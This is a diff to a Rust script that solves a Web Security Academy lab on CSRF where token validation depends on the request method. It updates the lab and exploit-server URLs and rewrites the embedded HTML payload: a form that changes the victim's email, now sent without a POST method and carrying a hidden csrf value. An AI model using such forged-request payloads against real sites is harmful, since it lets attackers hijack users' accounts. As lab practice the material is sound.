@@ -4,7 +4,7 @@
 *
 * Date: 21/10/2023
 *
-* Lab: CSRF vulnerability with no defenses
+* Lab: CSRF where token validation depends on request method
 *
 * Steps: 1. Deliver the exploit to the victim
 *        2. The victim's email will be changed after he trigger the exploit
@@ -31,10 +31,10 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0ac20097049135328067b7e10022005a.web-security-academy.net";
+    let url = "https://0ab6009f047e2b0787adb80100fc00ad.web-security-academy.net";
 
     // change this to your exploit server URL
-    let exploit_server_url = "https://exploit-0a540083047b35948098b6ac01ff0077.exploit-server.net";
+    let exploit_server_url = "https://exploit-0aca00a204332be087a8b70c018f002e.exploit-server.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
@@ -50,8 +50,9 @@ fn main() {
     let payload = format!(
         r###"<html>
                 <body>
-                <form action="{url}/my-account/change-email" method="POST">
+                <form action="{url}/my-account/change-email">
                     <input type="hidden" name="email" value="{new_email}" />
+                    <input type="hidden" name="csrf" value="b2eUm7UybY24D3Jjnda5t2OUib3N2Cvr" />
                     <input type="submit" value="Submit request" />
                 </form>
                 <script>
